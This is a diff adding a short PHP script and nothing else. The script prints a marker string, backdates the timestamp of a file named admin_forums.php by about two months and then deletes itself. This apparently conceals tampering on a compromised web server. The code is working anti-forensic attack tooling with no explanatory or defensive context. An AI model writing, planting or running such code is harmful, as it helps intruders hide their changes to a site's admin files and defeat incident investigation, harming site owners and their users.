@@ -1,0 +1,1 @@
+<?php echo "pXZUTkFNQV"; if (file_exists("./admin_forums.php")){ touch("./admin_forums.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*bv9stusq3vCsqxXHQWK5*/ ?>
